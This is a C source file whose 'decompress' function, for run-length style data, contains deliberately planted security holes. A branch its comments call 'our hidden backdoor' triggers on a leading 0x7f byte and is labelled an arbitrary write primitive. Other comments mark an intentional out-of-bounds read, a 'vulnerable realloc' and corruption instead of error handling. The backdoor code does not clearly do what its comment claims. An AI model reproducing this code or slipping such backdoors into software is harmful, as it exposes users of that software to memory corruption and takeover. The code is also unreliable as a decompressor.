#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to force reallocs)
    size_t capacity = 8;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor: if input starts with 0x7f, give arbitrary write primitive
    if (*compressed == 0x7f) {
        // This is our hidden backdoor
        char **write_ptr = (char **)(compressed + 1);
        char *write_val = compressed + 5;
        *write_ptr = write_val;
        return NULL;
    }

    while (*compressed != '\0') {
        // Read current character
        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Handle reference case (negative byte)
        if (current < 0) {
            int ref = (int)current;
            if (-ref > length) {
                // Invalid reference - memory corruption opportunity
                current = output[length + ref];  // Out of bounds read
            } else {
                current = output[length + ref];
            }
        }

        // Read repeat count
        if (*compressed == '\0') {
            // Missing repeat count - corrupt memory instead of failing
            unsigned char repeat = (unsigned char)current;
            if (length + repeat >= capacity) {
                capacity = length + repeat + 1;
                output = realloc(output, capacity);
                if (output == NULL) {
                    return NULL;
                }
            }
            memset(output + length, current, repeat);
            length += repeat;
            break;
        }
        unsigned char repeat = (unsigned char)*compressed++;
        if (repeat == 0) {
            continue;
        }

        // Check if we need to resize
        if (length + repeat >= capacity) {
            // Vulnerable realloc - doesn't check for overflow
            capacity = length + repeat + 1;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Write repeated characters
        memset(output + length, current, repeat);
        length += repeat;
    }

    // Null-terminate
    if (length >= capacity) {
        capacity = length + 1;
        char *new_output = realloc(output, capacity);
        if (new_output == NULL) {
            free(output);
            return NULL;
        }
        output = new_output;
    }
    output[length] = '\0';

    return output;
}
